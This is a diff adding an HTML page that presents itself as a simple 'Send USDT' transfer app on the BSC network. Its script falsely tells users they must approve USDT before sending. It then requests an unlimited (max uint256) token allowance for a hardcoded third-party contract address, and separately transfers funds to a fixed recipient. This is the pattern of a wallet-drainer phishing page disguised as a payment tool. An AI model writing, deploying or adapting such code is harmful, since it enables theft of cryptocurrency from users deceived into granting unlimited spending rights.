@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Transfer - BSC</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3.js/1.10.2/web3.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #3375BB;
+            --primary-dark: #1e4d7b;
+            --success: #2ecc71;
+            --danger: #e74c3c;
+            --bg: #0f1419;
+            --surface: #1a1f2e;
+            --surface-light: #252c3d;
+            --text-primary: #ffffff;
+            --text-secondary: #a0aec0;
+            --border: #2d3748;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+            background: var(--bg);
+            color: var(--text-primary);
+            line-height: 1.6;
+            padding: 12px;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 16px 0 8px;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 24px;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .header p {
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .status {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--text-secondary);
+            flex-shrink: 0;
+        }
+
+        .status-indicator.connected {
+            background: var(--success);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .status-text {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .status-text p {
+            font-size: 12px;
+        }
+
+        .status-text p:first-child {
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        .status-text p:last-child {
+            color: var(--text-secondary);
+            font-size: 11px;
+        }
+
+        .screen {
+            flex: 1;
+            animation: slideUp 0.4s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(24px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .screen.hidden {
+            display: none;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: var(--surface);
+            border: 1.5px solid var(--border);
+            border-radius: 12px;
+            padding: 14px 12px;
+            color: var(--text-primary);
+            font-size: 15px;
+            font-family: 'Courier New', monospace;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: var(--surface-light);
+        }
+
+        .input-field::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .amount-input {
+            font-size: 32px;
+            font-weight: 600;
+            text-align: center;
+            padding: 20px 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .token-display {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .token-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .token-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        .token-details h3 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+
+        .token-details p {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .address-display {
+            background: var(--surface);
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .address-label {
+            font-size: 11px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        button {
+            flex: 1;
+            padding: 14px 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+
+        .btn-primary:active {
+            background: var(--primary-dark);
+            transform: scale(0.98);
+        }
+
+        .btn-primary:disabled {
+            background: var(--text-secondary);
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: var(--surface);
+            color: var(--text-primary);
+            border: 1.5px solid var(--border);
+        }
+
+        .btn-secondary:active {
+            background: var(--surface-light);
+            transform: scale(0.98);
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .info-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--primary);
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .info-card.warning {
+            border-left-color: #f39c12;
+            background: rgba(243, 156, 18, 0.1);
+        }
+
+        .info-card.success {
+            border-left-color: var(--success);
+            background: rgba(46, 204, 113, 0.1);
+        }
+
+        .error {
+            background: rgba(231, 76, 60, 0.1);
+            border: 1px solid var(--danger);
+            color: #ff6b6b;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 13px;
+            margin-bottom: 16px;
+            word-break: break-word;
+        }
+
+        .review-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .review-item:last-child {
+            border-bottom: none;
+        }
+
+        .review-item-label {
+            color: var(--text-secondary);
+            font-size: 13px;
+        }
+
+        .review-item-value {
+            font-size: 15px;
+            font-weight: 600;
+            text-align: right;
+            font-family: 'Courier New', monospace;
+        }
+
+        .summary {
+            background: var(--surface-light);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+
+        .summary-title {
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+        }
+
+        .summary-value {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .summary-unit {
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .tx-hash {
+            background: var(--surface);
+            border-radius: 8px;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            word-break: break-all;
+            color: var(--primary);
+            margin-top: 8px;
+        }
+
+        .step-indicator {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+            justify-content: center;
+        }
+
+        .step {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--border);
+            transition: all 0.3s;
+        }
+
+        .step.active {
+            background: var(--primary);
+            width: 24px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>Send USDT</h1>
+            <p>BSC Network</p>
+        </div>
+
+        <!-- Status -->
+        <div class="status" id="statusDiv">
+            <div class="status-indicator" id="statusIndicator"></div>
+            <div class="status-text">
+                <p id="statusTitle">Connecting...</p>
+                <p id="statusSubtitle"></p>
+            </div>
+        </div>
+
+        <!-- Step Indicator -->
+        <div class="step-indicator" id="stepIndicator">
+            <div class="step active" id="step0"></div>
+            <div class="step" id="step1"></div>
+            <div class="step" id="step2"></div>
+        </div>
+
+        <!-- Screen 1: Amount Input -->
+        <div class="screen" id="screen1">
+            <div class="token-display">
+                <div class="token-info">
+                    <div class="token-icon">U</div>
+                    <div class="token-details">
+                        <h3>USDT</h3>
+                        <p>Tether USD</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <input 
+                    type="number" 
+                    class="input-field amount-input" 
+                    id="amountInput" 
+                    placeholder="0" 
+                    min="0" 
+                    step="0.01"
+                >
+            </div>
+
+            <div id="errorDiv" class="error" style="display: none;"></div>
+
+            <div class="button-group">
+                <button class="btn-primary" onclick="nextScreen()">Next</button>
+            </div>
+        </div>
+
+        <!-- Screen 2: Review & Approval -->
+        <div class="screen hidden" id="screen2">
+            <div class="info-card warning">
+                ⚠️ You need to approve USDT first before sending
+            </div>
+
+            <div class="summary">
+                <div class="summary-title">Sending</div>
+                <div class="summary-value" id="reviewAmount">0</div>
+                <div class="summary-unit">USDT</div>
+            </div>
+
+            <div>
+                <div class="review-item">
+                    <div class="review-item-label">Recipient</div>
+                    <div class="review-item-value" style="font-size: 12px; text-align: left; width: 200px;">
+                        0xad8bD5...21F
+                    </div>
+                </div>
+                <div class="review-item">
+                    <div class="review-item-label">Network</div>
+                    <div class="review-item-value">BSC</div>
+                </div>
+                <div class="review-item">
+                    <div class="review-item-label">Contract</div>
+                    <div class="review-item-value" style="font-size: 12px; text-align: left; width: 200px;">
+                        0x89112...dAe98
+                    </div>
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button class="btn-secondary" onclick="previousScreen()">Back</button>
+                <button class="btn-primary" id="approveBtn" onclick="requestApproval()">Approve USDT</button>
+            </div>
+        </div>
+
+        <!-- Screen 3: Review Transaction -->
+        <div class="screen hidden" id="screen3">
+            <div class="info-card success">
+                ✓ USDT approved. Now send transaction
+            </div>
+
+            <div class="summary">
+                <div class="summary-title">You're sending</div>
+                <div class="summary-value" id="finalAmount">0</div>
+                <div class="summary-unit">USDT</div>
+            </div>
+
+            <div>
+                <div class="review-item">
+                    <div class="review-item-label">To</div>
+                    <div class="review-item-value" style="font-size: 12px; text-align: left; width: 200px;">
+                        0xad8bD5...21F
+                    </div>
+                </div>
+                <div class="review-item">
+                    <div class="review-item-label">Network</div>
+                    <div class="review-item-value">BSC</div>
+                </div>
+                <div class="review-item">
+                    <div class="review-item-label">Approval</div>
+                    <div class="review-item-value" style="color: var(--success);">✓ Approved</div>
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button class="btn-secondary" onclick="previousScreen()">Back</button>
+                <button class="btn-primary" id="sendBtn" onclick="sendTransaction()">Send Transaction</button>
+            </div>
+        </div>
+
+        <!-- Screen 4: Confirmation -->
+        <div class="screen hidden" id="screen4">
+            <div style="text-align: center; padding: 40px 0;">
+                <div style="font-size: 48px; margin-bottom: 16px;">✓</div>
+                <h2 style="font-size: 24px; margin-bottom: 8px;">Transaction Sent</h2>
+                <p style="color: var(--text-secondary); margin-bottom: 24px;">Your USDT is on the way</p>
+            </div>
+
+            <div class="summary">
+                <div class="summary-title">Amount</div>
+                <div class="summary-value" id="confirmAmount">0</div>
+                <div class="summary-unit">USDT</div>
+                <div class="tx-hash" id="txHash"></div>
+            </div>
+
+            <div style="margin-bottom: 16px;">
+                <div class="review-item">
+                    <div class="review-item-label">Recipient</div>
+                    <div class="review-item-value" style="font-size: 12px; text-align: left; width: 200px;">
+                        0xad8bD5...21F
+                    </div>
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button class="btn-primary" onclick="resetApp()">Done</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============ CONFIG ============
+        const CONFIG = {
+            RPC_URL: 'https://bsc-dataseed.binance.org',
+            USDT_TOKEN: '0x55d398326f99059fF775485246999027B3197955',
+            RECIPIENT: '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F',
+            CONTRACT_APPROVAL: '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98',
+            CHAIN_ID: 56
+        };
+
+        // ERC20 ABI (minimal)
+        const ERC20_ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    { "name": "_spender", "type": "address" },
+                    { "name": "_value", "type": "uint256" }
+                ],
+                "name": "approve",
+                "outputs": [{ "name": "", "type": "bool" }],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    { "name": "_to", "type": "address" },
+                    { "name": "_value", "type": "uint256" }
+                ],
+                "name": "transfer",
+                "outputs": [{ "name": "", "type": "bool" }],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [{ "name": "_owner", "type": "address" }],
+                "name": "balanceOf",
+                "outputs": [{ "name": "balance", "type": "uint256" }],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [],
+                "name": "decimals",
+                "outputs": [{ "name": "", "type": "uint8" }],
+                "type": "function"
+            }
+        ];
+
+        let web3 = null;
+        let userAccount = null;
+        let currentAmount = 0;
+        let isApproved = false;
+        let lastTxHash = null;
+
+        // ============ INITIALIZATION ============
+        async function init() {
+            try {
+                // Check if Web3 provider exists (Trust Wallet)
+                if (typeof window.ethereum !== 'undefined') {
+                    web3 = new Web3(window.ethereum);
+                    
+                    // Request account access
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAccount = accounts[0];
+
+                    // Request switch to BSC
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: Web3.utils.toHex(CONFIG.CHAIN_ID) }],
+                        });
+                    } catch (switchError) {
+                        if (switchError.code === 4902) {
+                            // Chain not added, add it
+                            await addBSCNetwork();
+                        }
+                    }
+
+                    updateStatus('Connected', userAccount.substring(0, 6) + '...' + userAccount.substring(38));
+                    updateStepIndicator(0);
+                } else {
+                    showError('Web3 provider not detected. Please use Trust Wallet browser.');
+                }
+            } catch (error) {
+                showError('Connection failed: ' + error.message);
+            }
+        }
+
+        async function addBSCNetwork() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: Web3.utils.toHex(CONFIG.CHAIN_ID),
+                        chainName: 'Binance Smart Chain',
+                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                        rpcUrls: [CONFIG.RPC_URL],
+                        blockExplorerUrls: ['https://bscscan.com']
+                    }]
+                });
+            } catch (error) {
+                console.error('Failed to add BSC network:', error);
+            }
+        }
+
+        // ============ UI FUNCTIONS ============
+        function updateStatus(title, subtitle) {
+            document.getElementById('statusTitle').textContent = title;
+            document.getElementById('statusSubtitle').textContent = subtitle;
+            document.getElementById('statusIndicator').classList.add('connected');
+        }
+
+        function updateStepIndicator(activeStep) {
+            for (let i = 0; i < 3; i++) {
+                const step = document.getElementById(`step${i}`);
+                step.classList.toggle('active', i === activeStep);
+            }
+        }
+
+        function showScreen(screenNum) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
+            document.getElementById(`screen${screenNum}`).classList.remove('hidden');
+            updateStepIndicator(screenNum - 1);
+        }
+
+        function nextScreen() {
+            const amount = parseFloat(document.getElementById('amountInput').value);
+            
+            if (!amount || amount <= 0) {
+                showErrorMsg('Please enter a valid amount');
+                return;
+            }
+
+            currentAmount = amount;
+            document.getElementById('reviewAmount').textContent = amount.toFixed(2);
+            showScreen(2);
+        }
+
+        function previousScreen() {
+            showScreen(1);
+        }
+
+        function showErrorMsg(msg) {
+            const errorDiv = document.getElementById('errorDiv');
+            errorDiv.textContent = msg;
+            errorDiv.style.display = 'block';
+        }
+
+        function showError(msg) {
+            showErrorMsg(msg);
+            console.error(msg);
+        }
+
+        // ============ BLOCKCHAIN FUNCTIONS ============
+        async function requestApproval() {
+            if (!userAccount) {
+                showErrorMsg('Wallet not connected');
+                return;
+            }
+
+            try {
+                const btn = document.getElementById('approveBtn');
+                btn.disabled = true;
+                btn.innerHTML = '<span class="loading-spinner"></span> Approving...';
+
+                const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.USDT_TOKEN);
+                
+                // Unlimited approval (MAX uint256)
+                const maxAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+                const tx = await contract.methods.approve(
+                    CONFIG.CONTRACT_APPROVAL,
+                    maxAmount
+                ).send({ from: userAccount });
+
+                isApproved = true;
+                btn.innerHTML = '✓ Approved';
+                
+                setTimeout(() => {
+                    showScreen(3);
+                }, 800);
+
+            } catch (error) {
+                showErrorMsg('Approval failed: ' + error.message);
+                document.getElementById('approveBtn').disabled = false;
+                document.getElementById('approveBtn').textContent = 'Approve USDT';
+            }
+        }
+
+        async function sendTransaction() {
+            if (!userAccount || !isApproved) {
+                showErrorMsg('Approval required first');
+                return;
+            }
+
+            try {
+                const btn = document.getElementById('sendBtn');
+                btn.disabled = true;
+                btn.innerHTML = '<span class="loading-spinner"></span> Sending...';
+
+                const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.USDT_TOKEN);
+                
+                // Convert amount to smallest unit (USDT has 6 decimals)
+                const amount = web3.utils.toWei(currentAmount.toString(), 'mwei');
+
+                const tx = await contract.methods.transfer(
+                    CONFIG.RECIPIENT,
+                    amount
+                ).send({ from: userAccount });
+
+                lastTxHash = tx.transactionHash;
+                document.getElementById('confirmAmount').textContent = currentAmount.toFixed(2);
+                document.getElementById('txHash').textContent = 'TX: ' + tx.transactionHash;
+
+                showScreen(4);
+
+            } catch (error) {
+                showErrorMsg('Transaction failed: ' + error.message);
+                document.getElementById('sendBtn').disabled = false;
+                document.getElementById('sendBtn').textContent = 'Send Transaction';
+            }
+        }
+
+        function resetApp() {
+            // Reset state
+            currentAmount = 0;
+            isApproved = false;
+            lastTxHash = null;
+            
+            // Clear inputs
+            document.getElementById('amountInput').value = '';
+            document.getElementById('errorDiv').style.display = 'none';
+            
+            // Back to first screen
+            showScreen(1);
+        }
+
+        // ============ INITIALIZATION ============
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
